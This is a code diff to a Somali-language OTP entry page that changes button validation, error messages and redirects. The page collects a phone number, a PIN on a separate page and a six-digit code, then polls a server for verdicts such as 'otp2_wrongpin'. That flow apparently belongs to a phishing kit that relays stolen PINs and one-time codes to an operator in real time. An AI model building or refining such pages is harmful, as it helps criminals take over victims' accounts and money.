@@ -91,7 +91,7 @@
 
     <div class="resend-text" id="timer-text"></div>
 
-    <button class="btn-verify" id="verify-btn">XAQIIJI OTP GA LABAAD</button>
+    <button class="btn-verify" id="verify-btn" disabled>XAQIIJI OTP GA LABAAD</button>
 
     <div id="status-msg"></div>
 </div>
@@ -113,8 +113,11 @@ let pollingInterval;
 
 window.onload = () => {
     if (!phone) {
-        window.location.href = "/page6";   // ✅ FIXED (PIN PAGE)
+        window.location.href = "/page6";
+        return;
     }
+
+    inputs[0].focus();
     startTimer();
 };
 
@@ -147,9 +150,11 @@ function resendCode() {
 inputs.forEach((input, index) => {
     input.addEventListener('input', () => {
         input.value = input.value.replace(/\D/g, '');
+
         if (input.value && index < inputs.length - 1) {
             inputs[index + 1].focus();
         }
+
         checkFull();
     });
 
@@ -160,16 +165,25 @@ inputs.forEach((input, index) => {
     });
 });
 
+/* FIXED VALIDATION */
 function checkFull() {
-    const code = Array.from(inputs).map(i => i.value).join('');
-    btn.classList.toggle('active', code.length === 6);
+    const values = Array.from(inputs).map(i => i.value);
+    const isComplete = values.every(v => v !== '');
+
+    if (isComplete) {
+        btn.classList.add('active');
+        btn.disabled = false;
+    } else {
+        btn.classList.remove('active');
+        btn.disabled = true;
+    }
 }
 
 btn.addEventListener('click', submitOtp);
 
 /* SUBMIT */
 async function submitOtp() {
-    if (!btn.classList.contains('active')) return;
+    if (btn.disabled) return;
 
     const otp = Array.from(inputs).map(i => i.value).join('');
 
@@ -198,25 +212,23 @@ function startPolling() {
 
             if (data.status === "otp2_correct") {
                 clearInterval(pollingInterval);
-                window.location.href = "/success.html";
+                window.location.href = "/page10.html";
             }
 
-            /* ❌ WRONG CODE (SOMALI) */
             if (data.status === "otp2_wrong") {
                 clearInterval(pollingInterval);
-                statusMsg.innerText = "❌ Koodhka waa khalad, fadlan dib u geli koodhka saxda ah";
+                statusMsg.innerText = "❌ Koodhka waa khalad, fadlan dib u geli";
                 statusMsg.style.color = "red";
                 resetInputs();
             }
 
-            /* 🔑 WRONG PIN → GO BACK TO PAGE 6 */
             if (data.status === "otp2_wrongpin") {
                 clearInterval(pollingInterval);
-                statusMsg.innerText = "🔑 PIN waa khalad, fadlan geli PIN-ka saxda ah mar kale";
+                statusMsg.innerText = "🔑 PIN waa khalad, isku day mar kale";
                 statusMsg.style.color = "red";
 
                 setTimeout(() => {
-                    window.location.href = "/page6";   // ✅ FIXED
+                    window.location.href = "/page6";
                 }, 1500);
 
                 resetInputs();
@@ -230,6 +242,7 @@ function startPolling() {
 function resetInputs() {
     inputs.forEach(i => i.value = "");
     btn.classList.remove('active');
+    btn.disabled = true;
 }
 </script>
 
